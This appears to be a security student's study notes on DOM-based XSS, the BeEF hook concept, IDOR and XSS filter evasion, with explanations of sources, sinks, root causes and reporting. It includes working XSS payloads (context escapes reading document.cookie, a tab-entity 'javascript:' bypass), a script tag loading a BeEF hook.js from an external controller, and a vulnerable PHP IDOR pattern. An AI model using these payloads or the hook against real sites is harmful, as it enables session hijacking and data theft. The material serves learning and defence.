# XSS Advanced Concepts: DOM-Based Theory, BeEF, IDOR & Filter Evasion

---

## Part 1: DOM-Based XSS (Theoretical Understanding)

### What Makes DOM-Based XSS Different

Reflected and Stored XSS both involve the **server** — the payload travels through an HTTP request or response, and the server either echoes it back (Reflected) or stores and later serves it (Stored). DOM-Based XSS is fundamentally different: the payload **never reaches the server at all**.

```
Reflected/Stored XSS data flow:
  Browser → HTTP Request → SERVER processes/stores input → HTTP Response → Browser renders

DOM-Based XSS data flow:
  Browser → JavaScript reads data from the page's own URL/DOM
          → JavaScript writes that data back into the page
          → Browser renders it
  (Server is never involved in the vulnerable step)
```

### The Mechanism

DOM-Based XSS occurs when client-side JavaScript takes data from an attacker-controllable **source** (like `window.location`, `document.URL`, or `document.referrer`) and passes it to a dangerous **sink** (like `innerHTML`, `document.write()`, or `eval()`) without sanitization.

**Conceptual example:**
```javascript
// Vulnerable client-side code (illustrative)
var searchTerm = window.location.hash.substring(1);  // SOURCE
document.getElementById('results').innerHTML = "You searched: " + searchTerm;  // SINK
```

If a victim visits `https://example.com/search#<img src=x onerror=alert(1)>`, the fragment after `#` is never sent to the server (URL fragments are client-side only by HTTP specification), yet the JavaScript on the page reads it directly from `window.location` and writes it into the DOM via `innerHTML` — executing the payload entirely within the browser.

### Why This Matters for Detection

Because the payload never appears in server access logs (URL fragments are not transmitted to the server), DOM-Based XSS is **invisible to traditional server-side WAFs and log analysis**. Detection requires either static/dynamic analysis of the client-side JavaScript itself, or browser-based security tooling (CSP with strict `script-src`, or dynamic taint-tracking during code review).

### Common Dangerous Sinks

| Sink | Risk |
|------|------|
| `innerHTML` / `outerHTML` | Directly renders HTML, including `<script>`-equivalent event handlers |
| `document.write()` | Writes raw HTML into the page during load |
| `eval()` | Executes any string as JavaScript code |
| `setTimeout()` / `setInterval()` (string argument) | Implicitly calls `eval()` on a string argument |
| `location.href` (assignment) | Can redirect to `javascript:` URIs |

---

## Part 2: BeEF Hook Concept (Conceptual Understanding Only)

### What BeEF Is

BeEF (Browser Exploitation Framework) is a well-known, publicly documented open-source penetration testing tool used to demonstrate the real-world impact of a confirmed XSS vulnerability — specifically, that XSS is not just "an alert box popping up," but a foothold that can be escalated into meaningful control over a victim's browser session.

### The Conceptual Link Between XSS and BeEF

**XSS is the delivery mechanism, not the exploit itself.** Every payload tested this week (`<script>alert(...)</script>`, `<img src=x onerror=...>`) proves the same underlying fact: **arbitrary attacker-controlled JavaScript executes in the victim's browser.** `alert()` is simply the safest, most visible way to prove that fact during authorized testing. In a real engagement, that same injection point could instead load an external script:

```html
<script src="http://[server]:3000/hook.js"></script>
```

### The Conceptual Flow

```
1. XSS vulnerability confirmed (as demonstrated throughout this week)
         ↓
2. Instead of alert(), the payload loads an external JavaScript file (hook.js)
         ↓
3. The victim's browser executes hook.js, which establishes an ongoing
   communication channel back to a controller
         ↓
4. The browser is now "hooked" — it remains under the controller's
   command for as long as the victim keeps that browser tab/window open
         ↓
5. Command modules become available (documented publicly by the BeEF
   project) for browser-context actions: reading further DOM content,
   social-engineering prompts, or network reconnaissance from within
   the victim's browser context
```

### Why Understanding This Matters (Without Operating the Tool)

Every "harmless" `alert()` proof-of-concept in this week's DVWA and CVE case studies is architecturally identical to a BeEF hook delivery. The only difference is the payload's content — `alert(1)` versus `<script src=...>`. This reframes how a finding should be reported: an XSS finding should never be described as "low impact, just pops an alert" — the correct framing is "arbitrary JavaScript execution in the victim's session, which in this test was demonstrated safely via alert(), but is architecturally equivalent to full browser-session control."

This week's exposure to BeEF was theoretical and conceptual — understanding the architecture and its relevance to reporting, not hands-on deployment.

---

## Part 3: IDOR — Insecure Direct Object Reference

### The Vulnerability

```
Original request:  GET /user/profile?id=5
Modified request:  GET /user/profile?id=6
```

Simply changing the `id` parameter returned another user's profile data — usernames, email addresses, and account details — despite the requesting session having no authorization to view that specific account.

### Root Cause

IDOR occurs when an application uses a direct, predictable reference (like a sequential database ID) to retrieve a resource, **and fails to verify that the currently authenticated user is actually authorized to access the specific resource being requested.**

```php
// Vulnerable pattern
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = $id";
// Missing: WHERE id = $id AND owner_session_id = current_user_id()
```

The query is syntactically correct and returns real data — the flaw is entirely in **missing authorization logic**, not in the query's construction (this is why IDOR is a distinct bug class from SQL injection, even though both can involve a `WHERE` clause).

### IDOR vs XSS: Two Unrelated Bug Classes That Chain Well

| Aspect | XSS | IDOR |
|--------|-----|------|
| **Requires script execution** | Yes | No |
| **Requires filter bypass** | Yes | No |
| **Root cause** | Missing output encoding | Missing authorization check |
| **Fix category** | Encoding / CSP | Access control logic |

Understanding these as separate bug classes matters because a single remediation (like input sanitization, which is often over-emphasized as "the" web security fix) addresses neither of them correctly on its own — XSS needs output encoding, IDOR needs authorization checks. Conflating them leads to reports that recommend the wrong fix.

### Connection to Prior Work

This is the same vulnerability class documented in Week 4's RecruitX assessment, where sequential ID manipulation exposed unauthorized records. The consistent finding across multiple engagements — this week's generic test and Week 4's RecruitX case — is that **sequential, guessable identifiers combined with missing per-request authorization checks** remain one of the most common real-world API flaws, precisely because the query itself works exactly as the developer intended; only the missing check is absent.

---

## Part 4: Context and Evasion Techniques

### Context Escape

XSS payload construction depends entirely on **where** the injection point sits in the page's existing markup. A payload effective in one context fails silently in another.

**Escaping an HTML attribute context:**
```html
<!-- If input lands here: <input value="[INJECTION POINT]"> -->
Payload: "><script>alert(document.cookie)</script>
Effect:  Closes the value="..." attribute and the input tag itself,
         then injects a fresh script tag as new markup.
```

**Escaping a JavaScript string context:**
```javascript
// If input lands here: var x = "[INJECTION POINT]";
Payload: ';alert(document.cookie)//
Effect:  Closes the existing quoted string, terminates the statement,
         injects a new statement, then comments out the remainder
         of the original line to avoid a syntax error.
```

Understanding context is why a single "universal" XSS payload does not exist in practice — successful exploitation requires first identifying whether the injection point sits inside an HTML tag body, an HTML attribute, a JavaScript string, a JavaScript context without quotes, or a URL.

### Evasion via Whitespace Encoding

**Technique:** Some legacy filters check for the literal substring `javascript:` as a blocklist pattern. Browsers historically tolerated certain whitespace characters embedded inside the `javascript:` URI scheme keyword itself, effectively defeating a naive substring match.

**Example payload:**
```html
<IMG SRC="jav&#x09;ascript:alert('XSS');">
```

**Mechanism:**
```
&#x09; = HTML hex entity for a horizontal TAB character (ASCII 0x09)

The filter checks for the literal string "javascript:" and does not
find it (because "jav" + TAB + "ascript:" is not an exact match).
Historically, browsers parsing the src attribute would decode the
HTML entity, strip the whitespace character during URI-scheme
parsing, and still recognize "javascript:" as the protocol handler.
```

**Important accuracy note:** This is a legacy technique, well-documented in the classic OWASP/RSnake XSS Filter Evasion Cheat Sheet. Modern browsers have significantly hardened URI-scheme parsing, and this specific whitespace-stripping tolerance is largely closed in current Chrome, Firefox, and Edge. It remains valuable to understand **as a category** — filters built on substring blocklists can be defeated by any encoding the rendering engine will normalize but the filter will not — even where this exact 2005-era payload no longer functions on fully patched modern browsers. Legacy or embedded systems using outdated rendering engines may still be affected.

**Other whitespace entities in the same evasion family:**
```
&#x09;  Horizontal Tab
&#x0A;  Line Feed (newline)
&#x0D;  Carriage Return
```

### Why This Category of Technique Still Matters

Even where a specific historical payload no longer works, the underlying lesson generalizes: **any filter based on matching a literal string is only as strong as its assumption about how that string can be encoded, fragmented, or represented.** This is the same root lesson as the `str_replace('<script>')` and `preg_replace` bypasses demonstrated against DVWA this week — different specific techniques, identical structural weakness.

---

## References

- OWASP DOM-Based XSS: https://owasp.org/www-community/attacks/DOM_Based_XSS
- OWASP XSS Filter Evasion Cheat Sheet: https://owasp.org/www-community/xss-filter-evasion-cheatsheet
- BeEF Project (official, public documentation): https://beefproject.com/
- CWE-79: https://cwe.mitre.org/data/definitions/79.html
- CWE-639 (IDOR): https://cwe.mitre.org/data/definitions/639.html
